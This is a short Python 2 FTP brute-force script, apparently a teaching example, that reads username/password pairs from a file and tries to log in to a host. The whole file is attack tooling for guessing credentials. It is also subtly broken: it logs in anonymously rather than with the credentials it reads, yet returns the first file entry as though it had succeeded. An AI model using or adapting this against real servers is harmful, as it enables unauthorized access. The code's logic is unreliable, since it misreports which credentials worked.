import ftplib

def bruteLogin(hostname, passwdFile):

	pFile = open(passwdFile, 'r')
	for line in pFile.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print "[+] Trying: " + userName + "/" + passWord
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login('anonymous', 'me@your.com')
			print "[*] " + str(hostname) + " FTP Anonymous Logon Succeeded."
			ftp.quit()
			return (userName, passWord)
		except Exception, e:
			pass

	print "[-] Could not brute force FTP credentials"
	return (None, None)

def main():
	bruteLogin('127.0.0.1', '8.ftpCredentials.txt')

if __name__ == "__main__":
	main()
